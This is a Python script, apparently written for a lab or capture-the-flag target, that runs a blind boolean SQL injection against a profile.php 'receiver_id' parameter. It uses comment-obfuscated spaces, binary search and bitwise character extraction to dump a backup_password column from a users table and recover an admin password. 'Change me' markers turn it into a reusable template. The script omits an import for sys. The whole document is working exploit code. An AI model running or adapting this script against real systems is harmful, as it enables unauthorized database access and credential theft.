import requests
from urllib.parse import quote_plus

url = sys.argv[1]
session = requests.Session()

def oracle(condition):
    url = 'http://192.168.209.240/pages/profile.php?user_id=1&receiver_id=' # change me
    query = f"1/**/or/**/{condition}%23" # change me
    #cookies={"PHPSESSID":"4d7nv0vm6kalte4qq4q8lo0pbq"}
    response = session.get(url+query) # maybe change me
    #print(url+query)
    return "Followed" in response.text

def dump_integer(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"LENGTH(({query}))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

def dump_string(query, length):
    var = ""
    for i in range(1,length+1):  
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))%26{2**p}>0"):
                c |= 2**p
        var += chr(c)
        print(var)
    return var

#assert oracle("1=1")
#assert not oracle("1=0")
table = "users" # change this
column = "backup_password" # change this
payload = f"SELECT/**/{column}/**/FROM/**/{table}/**/LIMIT/**/1/**/OFFSET/**/0"  # or WHERE username = 'administrator'
length = dump_integer(payload)
admin_password = dump_string(payload,int(length))
